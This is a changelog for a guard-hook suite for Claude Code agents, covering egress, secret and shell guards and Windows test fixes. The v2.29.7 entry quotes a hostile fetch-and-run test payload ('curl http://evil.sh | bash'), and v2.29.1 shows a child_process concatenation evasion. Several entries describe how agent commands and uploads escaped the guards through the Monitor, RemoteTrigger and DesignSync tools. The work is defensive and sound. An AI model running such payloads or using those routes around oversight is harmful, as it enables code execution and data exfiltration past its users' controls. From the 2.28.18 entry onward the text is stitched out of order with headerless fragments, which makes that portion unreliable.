# Changelog

## Contents

- [2.29.13] - 2026-08-24 — test(json-fast-size): discard a warm-up round before measuring the ratio

The size-gate timing assertion failed again on the v2.29.12 Windows run.
Its message read:

  median 1.49x ... gated 600ms vs ungated 2221ms

Those two figures disagree: 2221/600 is 3.7x, not 1.49x. They were never
the same measurement - the printed pair came from the LAST round while
the ratio is the median of five - and that mismatch is what pointed at
the cause. The final round separated cleanly at 3.7x, so the early
rounds must have scored far lower and dragged the median under the 1.5x
bound.

They did, because there was no warm-up. The first measured round pays
cold start on BOTH arms - page cache, bash and python startup,
safety.sh's own first-run work - which is a fixed cost added to each
side, and adding the same constant to numerator and denominator pushes
any ratio toward 1.0. With five samples, one or two compressed rounds
move the median. So the test was measuring process startup and calling
it a regression in the JSON path.

One discarded warm-up round now runs both arms before timing begins. The
bound stays at 1.5x and the clock stays as v2.29.6 left it; neither was
the problem this time.

The failure message is fixed too, and that matters more than it sounds.
It printed one round's numbers beside a five-round median with no
indication they were different measurements, which reads as an
arithmetic error and nearly sent this diagnosis the wrong way. It now
prints every round's ratio, so the next failure is legible at a glance.
It also said 600mss - a stray character from a variable that already
carried its own unit.

Honest note: this is the THIRD fix to this one assertion - bound 2.0x to
1.5x, then a median of paired rounds, then the fork-free clock, and now
this. Each addressed a real and different cause, but if it flakes a
fourth time the right answer is to stop gating Windows on a wall-clock
ratio rather than tune it again.

3844 tests passing.. 3844 tests passing.
- [2.29.12] - 2026-08-23 — fix(designsync): resolve localPath against the plan's approved dir, and stop skipping silently

Closes the gap flagged in v2.29.11's own release notes rather than
leaving it as a standing inconsistency: the hook ASKED when a batch
exceeded its 128-file scan cap, but silently skipped any file it could
not locate - the same silent-cap shape, decided the other way.

The cause was structural. write_files carries a planId, not the localDir
that finalize_plan approved, so the guard resolved relative localPaths
against cwd and hoped. When a bundle is built anywhere other than the
session's cwd, every file in it resolved nowhere and was passed over
without a word - and since these bytes never enter the session, nothing
downstream would check them either.

finalize_plan is now INSPECTED (never gated) to record the localDir it
approves, keyed per session, and write_files resolves each localPath
against the explicit localDir, then that remembered one, then cwd. A file
that resolves nowhere is counted and ASKED about.

Proven, not assumed. The new test plants a secret in a file under a
finalize_plan localDir that differs from cwd; against the pre-fix guard
it returns passthrough - a real credential uploaded unchecked - and
against the fixed one it denies. The unresolvable-file test likewise
fails pre-fix.

Behaviour change worth stating: a localPath that resolves nowhere used to
pass through and now asks. For a file that genuinely does not exist the
upload would fail anyway, so the prompt is mild; for one that exists
somewhere we did not look, it is the whole point.

A contract test caught the header edit: the kill-switch line must sit
within the first 40 lines and my longer comment pushed it to 42, so a
documented switch became undocumented. Header condensed rather than the
test relaxed.

3844 tests passing.. 3844 tests passing.
- [2.29.11] - 2026-08-23 — test(designsync): pass a native path in the payload, not an MSYS one

The DesignSync guard's three localPath assertions failed on Windows and
reddened v2.29.9. Ground truth from the CI log:

  FAIL a secret in a file uploaded BY PATH is denied - expected deny, got passthrough
  FAIL an absolute localPath is resolved too - expected deny, got passthrough
  FAIL the leaky file is found even when it is not the first entry - expected deny, got passthrough

The split is the diagnosis: the INLINE data assertion passed, and so did
every assertion that never opens a file. Only the ones that read a path
failed, and they failed OPEN.

This is the MSYS transport rule the v2.27-2.29 Windows arc was built on.
MSYS rewrites paths passed as environment variables and as plain
arguments, but NOT string content inside a JSON payload. The test put an
mktemp path into the payload's cwd and localDir, so native Windows python
received /tmp/tmp.XXXX, open() raised, and the guard did what it is
supposed to do with an unreadable file - skip it - which reads as
passthrough. Nothing was wrong with the product: real Claude Code hands
Windows hooks a drive-lettered path.

Fixed with native_path (cygpath -m) from helpers.sh, the same fix this
repo already uses for the typecheck cache key, and a plain passthrough
off Windows. The fixture files are still CREATED through the mktemp path,
which bash resolves correctly; only the payload-embedded copies change.

Separately noted, not fixed here: write_files carries a planId rather
than the localDir that finalize_plan approved, so the guard resolves
relative localPaths against cwd as a best guess. If those differ, it can
fail to find a file the tool will happily upload, and skip it silently -
the same silent-cap shape the >128-file branch already asks about. Worth
a decision rather than a reflex.

3843 tests passing.. 3843 tests passing.
- [2.29.10] - 2026-08-23 — fix(egress): scan Monitor ws URLs — the last unguarded egress channel

v2.29.7 put the 16 Bash guards on Monitor's command field, but the ws
form carries no command at all, so those guards had nothing to inspect.
Verified before changing anything: safety, bulk-exfil-guard,
mcp-egress-guard and webfetch-egress-guard ALL returned allow for
Monitor with a wss URL, and webfetch-egress-guard was registered on
WebFetch and WebSearch only. A WebSocket URL is a fetch target in
exactly the sense WebFetch's is, exfiltration included, since the data
rides in the query string.

Extended the existing guard rather than adding a new hook: same egress
class, same shared lib-egress-patterns.sh, one place to change. Only
ws.url is read - the command channel is already covered and re-scanning
it would double-report. This closes the gap v2.29.7 explicitly recorded
as still open rather than leaving that note to become permanent debt.

Two mistakes worth recording, both caught by tests rather than by
reading the diff.

The first attempt did nothing at all. The python gate gated on
tool not in (WebFetch, WebSearch) and exited before reaching the new
branch, so the four DENY assertions failed while the two
allow-shaped ones passed - a reminder that a passing allow case proves
nothing when the hook is inert. Widening that tuple was the actual fix.

The second was mine and older than this repo's patience for it: the
comment I added used backticks around two field names, INSIDE a
double-quoted python3 -c block, where bash performs command
substitution before python ever sees the text.
tests/test-interp-block-safety.sh exists precisely for that class and
caught it at line 51. The guard against it is scoped to the -c block,
since backticks in the bash header comments above are ordinary text.

3843 tests passing.. 3843 tests passing.
- [2.29.9] - 2026-08-23 — feat(hooks): scan DesignSync uploads, the one egress path nothing else can see

DesignSync had no guards. It is an egress primitive and belongs to the
family that already covers every other one - artifact-publish-guard,
bulk-exfil-guard, mcp-egress-guard, sendmessage-guard,
webfetch-egress-guard - so this was the third parity gap from the same
coverage-diff sweep, after Monitor (v2.29.7) and RemoteTrigger (v2.29.8).

It is the worst case in that family, for a reason the tool states about
itself: write_files takes a localPath and the tool reads from disk,
encodes and uploads so that contents never enter your context. Every
other credential check we own runs on text that passed through the
session - the output scanners, the commit guard, the artifact guard.
These bytes never do. Upload a .env or a private key this way and no
other layer could notice, because nothing ever sees it. That is the
argument for the hook existing: not that another check might miss it,
but that no other check can run at all.

So it reads the file itself, exactly as artifact-publish-guard reads the
page it is about to publish, and DENIES on a credential match. Deny
rather than warn, for the same asymmetry: the project is readable by
other org members and the upload is not reversible from here. Inline
data is scanned too, so the two shapes of the same call cannot disagree
about what counts as a secret. Patterns come from the shared
lib-secret-patterns.sh, never a local copy.

Scope is narrow on purpose: only write_files. The read methods send
nothing, and finalize_plan moves no bytes, so neither is touched.

No silent cap. The scan is bounded at 128 files and 256KB each to stay
responsive, and a batch larger than that ASKS rather than returning a
clean verdict that only covered part of it - a pass there would be a lie,
since nothing downstream can check the remainder either.

NOT covered, and not implied to be: delete_files removes files from a
shared remote project. Destructive, but not exfiltration, and left for a
separate decision rather than folded in quietly.

3836 tests passing.. 3836 tests passing.
- [2.29.8] - 2026-08-23 — feat(hooks): guard RemoteTrigger, the cloud sibling of the Cron* tools

RemoteTrigger had no guards at all. Cron* does have one (cron-discovery),
so this was a straight parity gap: the local scheduler was covered and
the remote one was not. Found by the same coverage-diff sweep as the
Monitor bypass in v2.29.7.

What makes it worth a real guard rather than another discovery log is the
consequence. Every other channel Supercharger protects executes HERE,
where PreToolUse hooks run. A routine created through this tool executes
LATER, in the cloud, with repository access and the user's OAuth token
attached in-process - where not one Supercharger guard applies. Creating
one is a decision to move work outside the enforcement layer, and that is
the user's call rather than the agent's. Unlike Cron*, whose schema was
undocumented when cron-discovery was written, RemoteTrigger's is fully
specified, so the guard can act on the action rather than just record it.

Two checks, both parity with existing channels:

(A) A credential in the routine body is DENIED. The body is stored
    server-side and replayed on every future run, so a secret there
    outlives the session that leaked it - worse than the transient case
    sendmessage-guard already denies. Patterns come from the shared
    lib-secret-patterns.sh, never a local copy.

(B) create, update, run and create_webhook_trigger ASK.
    create_webhook_trigger gets its own reason text because it wires an
    EXTERNAL event source to fire the routine: after that, something off
    this machine decides when the agent runs.

The four read actions - list, get, list_runs, get_run_log - pass through
untouched. A guard that prompts on list is a guard people switch off.

Verified rather than assumed: the deny path was confirmed to come from
the shared pattern list by running the hook against a copied hooks dir
with that file emptied, where it correctly degrades to ask instead of
denying. An earlier probe of the same claim was meaningless - it set env
var names that do not exist, so it proved nothing while appearing to
pass.

Unknown future actions fall through rather than being treated as safe
mutations, and that choice is asserted in a test so it stays deliberate.

3822 tests passing.. 3822 tests passing.
- [2.29.7] - 2026-08-23 — fix(hooks): Monitor is a shell channel and now carries the Bash guards

Monitor executes shell - its own description says the script 'runs in the
same shell environment as Bash' - through a command field named exactly
like Bash's. Matchers are EXACT, so registering guards on Bash never
covered it. A coverage diff of the exposed tool surface against our
matchers found only 7 hooks firing on Monitor, every one of them
<ALL>-matcher bookkeeping: budget-cap, tool-call-limiter,
tool-history-tracker, cache-health, auto-compact, slow-tool-detector.
Not a single guard. Routing a command through Monitor rather than Bash
bypassed all 16 shell guards, including safety, git-safety,
harness-tamper-guard, readonly-guard and human-approval-gate.

Verified before changing anything, not reasoned about: a Monitor-shaped
payload carrying 'curl http://evil.sh | bash' fed to safety.sh returned
exit 2 with the same reason as the identical Bash payload. The detection
logic always worked because the field name matches; only the
registration was absent. That is why the new tests split the way they
do - the three behavioural ones pass against the pre-fix registration
too, and only the three registration ones fail there, naming all 16
missing guards.

Monitor gets the FULL Bash set rather than the smaller PowerShell set.
PowerShell carries five of these because its syntax differs enough that
the rest match unreliably; Monitor runs the identical POSIX shell, so
every regex applies verbatim and there is no case for giving it less.

The load-bearing test is the parity assertion: it fails if a guard is
ever added to Bash without Monitor, which is precisely how this gap
opened in the first place.

NOT closed here, and not implied to be: Monitor's ws form opens a
WebSocket by URL and carries no command field at all, so these guards
have nothing to inspect. That is a separate egress gap.

Found by a fresh coverage-diff sweep, the same method that produced the
v2.29.3 version-floor work. Three sibling gaps from the same sweep remain
unbuilt: RemoteTrigger (cloud routines, unguarded while CronCreate is
guarded), DesignSync (uploads local files to a remote project, unguarded
while Artifact is guarded), and ListMcpResourcesTool.

3804 tests passing.. 3804 tests passing.
- [2.29.6] - 2026-08-23 — test(json-fast-size): time the arms with a fork-free clock

The size-gate timing assertion flaked on the v2.29.5 Windows run and,
now that Windows gates with an empty exemption list, reddened master.
Nothing in the JSON path changed in that release - it touched the
version-floor hook, its test and the generated artifacts - so the test
was measuring the runner, not the code.

The ROUNDS were never the problem; the CLOCK was. Each arm was timed by
forking python twice to read time.time(), six forks per round, on the
same contended runner whose contention the median was meant to average
out. A process spawn on Git Bash is ~27ms and swings widely under load,
so the instrument cost about as much as the effect it was measuring.
This is the third attempt at this assertion - the bound was cut 2.0x to
1.5x, then one sample was replaced by a median of three - and the
comment added with the second fix already predicted this one: lowering
the bound again would only move the next flake further out.

So the bound is unchanged at 1.5x and the measurement is what changed.
EPOCHREALTIME is a bash 5 builtin costing no fork - the same clock
hooks/lib-timing.sh already uses - which removes all six forks per round
on Git Bash and ubuntu. macOS ships bash 3.2, has no such variable, and
keeps the python clock; macOS is not where this flakes. Rounds go 3 to 5
because they are nearly free once the forks are gone, and a round whose
gated arm measures 0ms is skipped rather than scored as 0.00, since that
would mean the clock is too coarse to divide by.

EPOCHREALTIME renders its separator per locale, so under a comma-decimal
locale the dot-strip would leave a comma and the arithmetic would produce
a confidently wrong number. It is checked numeric before it is trusted,
falling back to the python clock otherwise - verified by simulating both
separators.

Honest limit: this machine has only bash 3.2, so the EPOCHREALTIME branch
itself could not be executed locally. Its arithmetic was verified against
known values (0.25s -> 250ms, ratio math exact) and the locale fallback
was verified directly, but the branch first runs on CI - where ubuntu
exercises it in minutes, well before the Windows job.

3798 tests passing.. 3798 tests passing.
- [2.29.5] - 2026-08-23 — fix(version-floor): warn on systemMessage, the channel Claude Code actually reads

The hook shipped in v2.29.3 announced its warning on stderr. Measured
against a live 2.1.240 with --debug hooks, a hook's stderr arrives in the
debug log as a bare unhandled line, while stdout JSON is logged as
'Parsed initial response' and rendered to the user. So the hook whose
entire purpose is to report a failure nobody can see was itself
reporting on a channel nobody sees.

Found by testing the assumption rather than trusting the precedent it
was copied from. The first probe was inconclusive in a way worth
recording: in -p mode NEITHER stderr nor systemMessage reached stdout,
which looked like 'stderr is fine, headless just shows nothing'. Running
all four combinations (stderr/systemMessage x sync/async) under
--debug hooks separated them - systemMessage was parsed in both modes,
stderr was inert in both.

Also switched from async to blocking. async was inherited from
update-check, which is async because it makes a network call; this hook's
steady state is a single stat, so there is nothing to gain by detaching
its output from the response the parser reads.

Two new tests: the output must parse as JSON carrying systemMessage, and
stdout must be EMPTY on a current build - a stray non-JSON byte there
would be read as a hook response every session.

One of the existing tests was silently weakened by the change and is now
fixed: it counted flagged events with grep -c, which counts LINES. The
whole message is a single JSON line now, so it returned 1 for every
version and would have passed no matter what the hook did.

3798 tests passing.. 3798 tests passing.
- [2.29.4] - 2026-08-23 — test(version-floor): pin the cache-invalidation fixture's mtimes

The cache-invalidation test was timing-dependent and went red on
ubuntu-latest while passing on macOS. CI ground truth:

  FAIL cache invalidates when the claude binary changes -- forks=1

The version cache is keyed on the claude binary's path, mtime and size.
mtime has whole-second granularity, and the two stand-in binaries the
test writes are both exactly 124 bytes -- '2.1.100' and '2.1.240' are
the same length -- so size never distinguished them. On a fast runner
both writes land inside one second, the key does not change, the hook
correctly reuses its cache, and the test's expectation of a re-detect
fails. On the slower macOS run the second boundary happened to fall
between the writes, which is the only reason it ever passed.

Reproduced locally before changing anything, by forcing the two writes
to share an mtime: the hook then reported cached_before=2.1.100 and
cached_after=2.1.100 with forks=1 -- the CI symptom exactly. The first
attempt to reproduce it did NOT fail, because the wall clock ticked
between the writes; that near-miss is precisely the flakiness at issue.

Fixed in the fixture, not the product. A real Claude Code upgrade
changes the binary's size and does not land in the same second as an
earlier probe, so the key is sound for the case it exists to cover;
hardening it against a same-second same-size replacement would add
platform-divergent sub-second stat handling for a scenario that does
not occur. The fixture now sets explicit mtimes (12:00 and 13:00),
which is what a real upgrade looks like, so the key differs by
construction rather than by machine speed. Verified stable over 5
consecutive local runs.

3796 tests passing.. 3796 tests passing.
- [2.29.3] - 2026-08-23 — feat(hooks): warn when Claude Code predates a hook event we register

Claude Code silently ignores a hook registered on an event it does not
know. It does not fire it, does not warn, and does not error — verified
on 2.1.240 by registering a deliberately bogus event name and reading
the --debug hooks log, which showed the hook subsystem running normally
with no mention of the bogus event anywhere in the log or on stdout.

18 of the 28 events Supercharger registers carry a version floor, the
highest being DirectoryAdded at 2.1.219. On a build older than that, 19
hooks are registered and simply absent, with nothing anywhere saying so
— the same silent-failure shape as the comma matchers fixed in v2.29.2,
found by asking what else that bug's class covered.

It cannot be fixed the way v2.29.2 was. A comma matcher had an older
equivalent spelling to fall back to; an event that does not exist yet
has none, so the only honest move is to say so. A SessionStart hook now
compares the running version against the floor table and names exactly
which hooks are inert and what each one does.

The message also says plainly that core protection is unaffected, which
is true and load-bearing: every guard on PreToolUse and PostToolUse —
safety, path, secret and injection scanning — sits on baseline events
that predate every supported build. Only advisory and telemetry hooks
are floored, three of them security-relevant (secret redaction in
displayed messages, the config-weakening notice, the elicitation guard).

Cost was measured, not assumed: claude --version is 89-117ms, far too
much per session, so it is cached against the binary path, mtime AND
size. Steady state is one stat; an upgrade invalidates the cache by
itself. Size is in the key because mtime alone is whole-second and a
binary replaced within the same second kept the stale version — the
drift test caught that. lastOnboardingVersion in ~/.claude.json looked
like a free version source and was rejected: it read 2.1.212 on a
machine running 2.1.240, which would have produced false warnings.

Fails open everywhere — no claude on PATH, unparseable version, all
silent and exit 0. Warns at most once a day per version so a
deliberately pinned build does not nag every session.

The load-bearing test is the drift guard: it fails when an event we
register is absent from both the floor table and the baseline list, so
adopting a newly-shipped event cannot silently reopen this hole. Proven
to bite by removing an entry and watching it name the offender.. 3796 tests passing.
- [2.29.2] - 2026-08-21 — fix(hooks): comma-separated matchers are rewritten to pipes, so the guardrails are not silently inert on Claude Code before 2.1.191

Claude Code decides matcher mode from the matcher's own characters: one made
only of [A-Za-z0-9_,| -] is an exact match, optionally a list separated by
either a comma or a pipe. The two separators mean the same thing, but only one
of them carries a version floor — 'Comma separators and the surrounding
whitespace tolerance require Claude Code v2.1.191 or later'. Below that
version 'Bash,PowerShell' is read as one literal tool name, which no tool has.

Supercharger emitted 35 such matchers and pins no minimum Claude Code version,
so on an older build safety.sh, the write guards, the CronCreate gate and the
secret scanners all selected nothing. An unmatched matcher fires nothing and
errors nothing, so the entire layer was absent with no in-product signal — the
same silent-failure class as the bare mcp__ matcher in v2.24.5. Upstream fixed
the parser in 2.1.191 (anthropics/claude-code#69970), but a user who has not
updated still gets the dead layer, and we are the ones who chose the comma.

The rewrite runs at emit time in both emitters, after the record is split on
'|' — the source tuple is pipe-delimited, so the commas have to stay there and
only the emitted matcher changes. It is gated to PreToolUse and PostToolUse,
because FileChanged matches file PATHS and Notification has its own vocabulary,
and gated again on the exact-match charset, because in a regex matcher '|' is
alternation rather than a list separator and the rewrite would change meaning.

The new test asserts the selected TOOL SET is unchanged rather than asserting
the new spelling, which is the only version of this check worth having: a
rewrite that quietly widened coverage — 'Bash|PowerShell' slipping into regex
mode and firing on BashOutput — would be a worse bug than the one being fixed.
It fails against the pre-fix hooks.json and names all 16 dead matchers. 3780 tests passing.
- [2.29.1] - 2026-08-20 — fix(safety): the shell-out guard no longer denies JavaScript's regex.exec()

The wrapper arm that catches an interpreter one-liner shelling out to the OS
matched any `exec(` at all, which is also how JavaScript runs an ordinary
regular expression against a string. Two legitimate `node -e` one-liners in
the live block ledger were denied for calling `secRe.exec(s)` in a while
loop — the same shape as the curl false positive fixed in v2.28.2, where a
benign identifier happens to supply a dangerous-looking token.

The arm now requires a quoted first argument. A shell-out passes a command
STRING; .exec() passes the subject variable. The obvious alternative — only
matching exec/spawn near the literal `child_process` — would have been
wrong, because that is precisely what this arm adds over the child_process
arm above it: it is the only thing that catches the concatenation evasion
require('child'+'_process').execSync(), where the literal never appears.
Both directions are now tested, so a future narrowing cannot quietly drop
the evasion.

Not changed, deliberately: a python one-liner calling subprocess.run(['git',
...]) is still denied. Five such commands are in the ledger and all five were
read-only, but the inner command is invisible to every Bash-layer guard, so
allowing 'git show' there also allows 'git push --force'. Same verdict as the
.supercharger.json self-modification block.

Verified by driving the deployed detector: 4 true positives still block, both
regex shapes now pass, and the two new FP tests fail against the pre-fix
detector while the two evasion tests pass on both sides.. 3775 tests passing.
- [2.29.0] - 2026-08-20 — ci(windows): all 226 test files pass on Git Bash and the exemption list is now EMPTY — the whole suite gates — the typecheck cache fix landed and the runner reports 226 clean, 0 failing. Every test file in the project now passes on Windows, so nothing is exempt and any failure on that platform fails the build. This is the finish line the recon named for itself when it said that once the failure list was triaged it would become a gating subset, and the number it started from was 22. Two of those were real product defects that shipped to users: session-analytics returned an empty report to every Windows user because its file list reached python as a multi-path environment variable, and the shebang advisory told users to chmod a file and then told them again after they did, because Windows python has no POSIX permission bits to read. Everything else was the harness lying about the product — six variants of one rule about which paths MSYS rewrites in transit, three instances of Windows python's text-mode stdout adding a carriage return, two tests whose subject was absent while some other output satisfied the assertion, and one fixture with a hardcoded date that had quietly expired. The list went from seven files to zero, and every single removal was demanded by the gate rather than predicted by me, because it fails when a listed file starts PASSING and names it. That property caught six stale exemptions in about twenty runs. It is also why the empty set is written as set() and not as an empty brace pair: the latter is a dict, and the subtraction that finds unexpected failures would raise on it — the gate would have become an error at the precise moment it had nothing left to exempt. Verified in three directions against the real 226-file log before shipping: it passes clean, it fails and names the file when a regression is injected, and it still refuses an empty log rather than passing vacuously. 3771 tests passing.
- [2.28.19] - 2026-08-20 — ci(windows): one file left in the exemption list, and 225 of 226 now gate — the multi-path environment variable fix landed. sc-toggle processes every settings file on Git Bash instead of only the first, the runner confirms it clean, and the gate asked for the file back. That is the sixth time it has caught its own list going stale, and the count is now 225 clean against 1 failing, from 219 and 7 when gating went in. Only test-hooks remains, carrying the single typecheck cache assertion whose fix is in the release before this one and has not reported yet. Worth recording what the last stretch cost and what it bought, because the ratio changed sharply once the instruments were fixed. Three of the final assertions took three releases each while I guessed at mechanisms from a machine that cannot run Git Bash, and every one of those guesses was wrong: a carriage return in a cache key, a failed file replace, an unresolvable path. All three fell in a single run each once the diagnostic actually observed the right thing at the right moment and reached the log. The typecheck answer in particular turned on a NEGATIVE observation — exactly one cache file in the scope directory — which eliminated the hypothesis I had already spent a release on, and no amount of further reasoning would have produced it. The pattern across this whole tail is consistent enough to be worth stating once: the harness was almost always the liar, the product was almost always fine, and the thing that repeatedly cost releases was not the difficulty of the bugs but the willingness to ship a plausible cause before building something that could see. 3771 tests passing.
- [2.28.18] - 2026-08-20 — fix(tests): the typecheck cache was seeded under a key the hook could never look up — the corrected diagnostic settled this in one run, and it refuted the hypothesis I had already shipped a fix for. There is only ONE cache file in the scope directory and its suffix matches the one the test wrote, so the project hash agreed all along and the CR-alignment change in v2.28.12 was addressing a difference that did not exist. The mismatch is one level down, in the lookup key rather than the file name. typecheck.sh passes FILE_PATH to python through an ENVIRONMENT VARIABLE, and MSYS converts those, so on Git Bash the hook looks up a drive-lettered path. The test seeded the cache with the raw POSIX path taken from the payload, which MSYS does not convert. Same file, same project hash, and a key that could never match — so the cache missed every time and tsc genuinely ran, which is the four-to-eight second run the assertion kept reporting. The hook is not at fault and needs no change: it WRITES the cache through that same converted variable, so in real use it is self-consistent. Only the hand-seeded fixture was out of step, and it is now written in the form the hook will look for. Worth stating what actually moved this from three guesses to an answer. The first diagnostic reported the cache file as absent because it ran after the cleanup that deleted it, and its file listing used ls, which hides the dotfiles it was meant to reveal. - [2.28.4] - 2026-08-19 — fix(post-write-advisor): Windows users were told to chmod +x on every shebang file, and told again after they did — the gate cleared its first real cycle, so the remaining tail is now readable rather than noise. Windows is 3763 passing and 7 failing across the six still-exempt files, and one of those seven is a genuine product defect rather than a harness artifact, which is exactly what the tail was supposed to be triaged for. The shebang-without-executable-bit advisory decides by testing the execute bits of os.stat. On Windows those bits do not exist in the POSIX sense: python derives st_mode from the read-only attribute and only marks a file executable when the extension is one Windows treats as executable, such as .exe or .bat. A .sh file can therefore never read as executable there. The advisory fired on every shebang file a Windows user wrote, advised them to run chmod +x, and then fired again unchanged after they did, because nothing it can observe was altered. Wrong, unactionable, and repeated on every write — the sort of noise that gets a whole advisory switched off. It is now POSIX-only. The test had to move with it, and this is the part worth being explicit about: on Windows the hook could not distinguish 0644 from 0755, so it warned for BOTH cases. Suppressing the advisory without touching the test would have flipped which of the two assertions failed rather than fixing anything, and the suite would have looked one failure better for the wrong reason. The pair is now branched on the platform — both expect silence under Git Bash, where the distinction is not observable, and the POSIX branch keeps asserting the real behaviour unchanged, which is what proves the advisory still works where it applies. The recon reported this as a test problem for weeks. It was reporting a real one. 3770 tests passing.

The narrowing loses nothing because the generic pipe-into-shell pattern already covers the canonical case independently. - [2.28.1] - 2026-08-19 — fix(perf-chain): every event name carried a trailing carriage return, so the sweep reported no hooks fire for PreToolUse — which was plainly false — the raised cap did its job in one cycle. With the skip list no longer truncated at P, the reason is visible for every event, and it is the same reason for all of them rather than the handful I expected. The event list is built by printing sorted keys from python and capturing that in bash. print goes through text-mode stdout, Windows translates every newline to CRLF, and bash does not split on a carriage return — so each name arrived as the event followed by a CR, the lookup into the hooks map missed for every single event, and a sweep advertising itself as covering every registered event collapsed to one row. Writing bytes fixes it, the same change made to both generators in v2.27.39, and this is now the third instance of that class in two days. The evidence was sitting in the log the whole time and I read past it twice. The failure message is built as the event and the tool joined by a slash, and it renders as No hooks fire for PreToolUse, then slash Bash on the NEXT LINE. A message that wraps in the middle of a fixed format string is a carriage return, and I treated it as a display artifact until the bytes were checked directly: twenty-seven of those messages end the event name with a literal CR. Reading the log is not the same as reading the bytes, which is the lesson from the CRLF assertion earlier this week repeating itself. A scan for the same shape across the repo finds 131 files capturing python stdout into a bash variable, and exactly one that strips CR. That is deliberately NOT being mass-fixed: the great majority pass on Windows because a stray CR is harmless in a numeric value or a message, and it only bites where the captured string becomes a lookup key, a filename component, or an exact comparison — this case, and the tool-history filename bug already recorded from an earlier release. A blanket edit across 131 files to fix two known sites would be far more likely to break something than to find anything. 3762 tests passing.

That is finally closed. The gate is a DENYLIST of the seven files that still fail, not an allowlist of the 219 that pass, and the distinction is the whole design. With an allowlist a newly added test file falls outside Windows coverage silently and forever; with a denylist it is gated from the moment it is written, and anyone wanting an exemption has to add a name and explain it. It also fails when a LISTED file starts passing, printing which one and asking for its removal, because a stale exemption is how a platform that has quietly been fixed quietly stops being tested. A denylist over a log has one obvious way to be wrong — passing when it has read nothing — so that is the case tested first: an empty log and a missing log both fail loudly rather than reporting a clean sweep. Verified in all four directions rather than only the convenient one. Against the real recon log it passes and reports 226 files, 219 clean, 7 failing. With a failure injected into an UNLISTED file it exits non-zero and names the file with its counts. With a LISTED file made clean it exits non-zero and asks for the list to be shrunk. With no sections at all it refuses. The first attempt at the injected-failure case was itself vacuous — the anchor I patched into did not exist in the log, so nothing changed and the gate looked correct for the wrong reason, which is the same defect this sequence has been finding all week and worth recording as having happened here too. Also adds TEST_SKIP to the runner, since a glob can select a subset but cannot express everything-except-these; it excludes from both the run loop and the replay loop, or the report lists files that never executed. 3762 tests passing.

The recon is 3753 passing and 9 failing, down from 3751 and 11, and both of those failures are gone. That one was a genuine product defect rather than a harness artifact: the file list reached python through an environment variable holding many paths, MSYS only rewrites single-path variables, so os.path.getmtime raised on every file, an except OSError swallowed each failure, and any Windows user running the tool got an empty report with no reason given. PreToolUse produces a row on this machine with seventeen hooks and produces no row on the runner, and it does not appear in the truncated skip list, so its reason has never actually been seen. A plausible mechanism exists — the matcher test splits on commas while the plugin manifest writes its tool list as pipe-separated alternation, so only the comma-separated and wildcard entries can ever match — but that is identical on both platforms and therefore explains nothing about the divergence on its own. The test now captures that stream to a file and includes the first twelve lines in its failure message. Proven by forcing the assertion to fail against a scratch copy of the tree and reading the resulting message, which carries the skipped-events section and its reasons — a check on the output path itself, not on whether the code prints locally, which it already did. - [2.27.43] - 2026-08-18 — fix(session-analytics): python could not stat any of the files, and I instrumented two exits while the runner used a third — this is a real Windows defect for users, not only for the suite. The tool builds its file list with find, which is an MSYS binary and resolves Git Bash paths perfectly well, then hands that list to python through an environment variable holding MANY paths. MSYS rewrites SINGLE-path variables; it does not rewrite a list. So python received MSYS paths, os.path.getmtime raised on every one of them, an except OSError swallowed each failure silently, and the report ended with zero sessions. The default projects directory lives under HOME, which Git Bash spells with a leading slash-c, so any Windows user running this got an empty report and no reason for it. The root is now converted once before find runs, so every path find emits is already one python can stat — cheaper and less error-prone than converting the list afterwards, and inert wherever cygpath does not exist. Two admissions. The first is that this was my original reading, and I talked myself out of it: I saw the message No session data found, went looking for the code that emits it, found a bash exit, instrumented that, then found a second bash exit and instrumented that too. There is a THIRD, inside the python block, and it is the one the runner reaches. Twice I answered which line prints this without answering which line runs, so two releases of instrumentation produced no information whatsoever. The comment claiming there are two such exits is corrected along with the code. The second is that the silent skip is itself the defect that made this expensive: a bare except OSError followed by continue turned a total failure to see the filesystem into a report that merely looked empty. The loop now counts what it drops and the zero-session exit prints those counts under CI or an explicit debug variable — files in the list, how many were unstat-able, how many fell outside the cutoff, and the cutoff itself. Verified by building a fixture deliberately older than the window and watching it report one file seen, zero unstat-able and one too old, which is the shape that would have identified this in a single run rather than three. 3762 tests passing.

The Windows recon is 3750 passing and 12 failing, down from 3748 and 14, and both generated-artifact staleness failures are gone. That was the CRLF-on-write fix: both generators handed their output back through text-mode stdout, where Windows python turns every newline into CRLF, so the freshly generated form could never match the committed LF file. Writing bytes fixed both, and the runner confirms it. The correction is the perf sweep. I attributed those two failures to an encoding default, added the UTF-8 guard its three sibling tools already set, and it changed nothing — the output was never lost, and the guard is retained purely as hygiene rather than as the fix it was presented as. What the runner log actually shows, once read rather than reasoned about, is a table with exactly ONE event row where there should be nine. The header is present, the legend is present, the ranking column is present; the events themselves are missing, which is precisely what the assertion reports when it says the sweep is missing events. The cause is structural rather than platform-specific. The sweep spawns a sub-run per event and discards BOTH of its streams, so any event whose sub-run fails contributes no line and is dropped from the table without trace, leaving a sweep that looks healthy while measuring almost nothing. That is the same defect as a staleness check that says only stale, and the third time in this sequence the fix has been to make a silent failure speak. An event that yields no row now reports the event name and the first two lines of what its sub-run said, on stderr so the table and the json output are byte-identical to before. Verified in both directions rather than the convenient one: a deliberately bogus event reproduces the exact condition the new branch handles, empty stdout with a real message on stderr, and a normal sweep still prints every row it did before. A PLAIN path argument is rewritten by MSYS on its way to a native Windows binary, but one containing a wildcard is not, so glob.glob received an MSYS path, matched nothing, and the on-disk list came back empty while the listed one was full — which reads as total drift. The failure message itself carried the proof and I had skimmed past it: it showed the listed array populated, meaning plugin.json had loaded fine through the first argument, and only the second had failed. The directory is now converted with the same helper the other transport fixes use, and the pattern is joined inside python, so no wildcard ever travels as an argument. This is the fourth distinct transport in the same family and the family is now worth stating plainly: MSYS rewrites environment variables and plain path arguments, and does not rewrite JSON payload content, paths interpolated into a python program, paths handed to a subprocess from inside python, or arguments carrying a wildcard. Every Windows failure resolved in this sequence has been one of those five, and none of them were product defects. The siblings were checked rather than assumed: the only other place a glob meets python in the suite already does the right thing, passing the directory as a plain argument and joining the pattern on the python side, so nothing else needed changing. 3762 tests passing.

